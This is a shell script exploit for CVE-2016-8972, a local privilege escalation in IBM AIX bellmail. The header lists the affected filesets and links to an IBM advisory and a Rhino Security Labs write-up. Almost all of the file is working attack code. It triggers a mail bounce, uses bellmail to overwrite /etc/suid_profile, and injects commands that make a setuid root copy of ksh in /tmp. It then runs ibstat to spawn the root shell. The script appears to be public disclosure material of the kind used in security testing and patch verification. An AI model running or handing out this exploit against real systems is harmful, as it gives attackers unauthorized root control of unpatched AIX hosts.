#!/usr/bin/sh
#
# CVE-2016-8972/bellmailroot.sh: IBM AIX Bellmail local root
#
# Affected versions:
# AIX 6.1, 7.1, 7.2
# VIOS 2.2.x
#
#         Fileset                Lower Level  Upper Level KEY
#        ---------------------------------------------------------
#        bos.net.tcp.client       6.1.9.0      6.1.9.200   key_w_fs
#        bos.net.tcp.client       7.1.3.0      7.1.3.47    key_w_fs
#        bos.net.tcp.client       7.1.4.0      7.1.4.30    key_w_fs
#        bos.net.tcp.client_core  7.2.0.0      7.2.0.1     key_w_fs
#        bos.net.tcp.client_core  7.2.1.0      7.2.1.0     key_w_fs
#
# Ref: http://aix.software.ibm.com/aix/efixes/security/bellmail_advisory.asc
# Ref: https://rhinosecuritylabs.com/2016/12/21/unix-nostalgia-aix-bug-hunting-part-2-bellmail-privilege-escalation-cve-2016-8972/
# @hxmonsegur //RSL - https://www.rhinosecuritylabs.com

ROOTSHELL=/tmp/shell-$(od -N4 -tu /dev/random | awk 'NR==1 {print $2} {}')
VULNBIN=/usr/bin/bellmail
SUIDPROFILE=/etc/suid_profile

function ESCALATE
{
    echo "[*] Preparing escalation"

    $VULNBIN >/dev/null 2>&1 <<EOD
s /etc/suid_profile
EOD

    if [ ! -w $SUIDPROFILE ]; then
        echo "[-] $SUIDPROFILE is not writable. Exploit failed."
        exit 1
    fi

    echo "[*] Clearing out $SUIDPROFILE"
    echo > /etc/suid_profile

    echo "[*] Injecting payload"
    cat << EOF >$SUIDPROFILE
cp /bin/ksh $ROOTSHELL
/usr/bin/syscall setreuid 0 0
chown root:system $ROOTSHELL
chmod 6755 $ROOTSHELL
rm -f $SUIDPROFILE
EOF

    echo "[*] Executing SUID to leverage privileges"
    /usr/bin/ibstat -a >/dev/null 2>&1

    if [ ! -x $ROOTSHELL ]; then
        echo "[-] Root shell does not exist or is not executable. Exploit failed."
        exit 1
    fi

    echo "[*] Escalating to root.."
    $ROOTSHELL
    echo "[*] Make sure to remove $ROOTSHELL"
}

echo "[*] IBM AIX 6.1, 7.1, 7.2 Bellmail Local root @hxmonsegur//RSL"

$VULNBIN -e
if [ $? -eq 0 ]
    then
        ESCALATE
        echo "[*] Make sure to remove $ROOTSHELL"
        exit 0
fi

echo "[*] Sending mail to non-existent user, force a bounce within ~minute"
/usr/bin/mail nonexistentuser <<EOD
.
.
.
EOD

echo "[*] Waiting for mail to come in."

while true
do
    $VULNBIN -e
    if [ $? -eq 0 ]
        then
            echo "[*] Mail found"
            ESCALATE
            break
        else
            echo "[-] Mail not received yet. Sleeping."
            sleep 10
        fi
done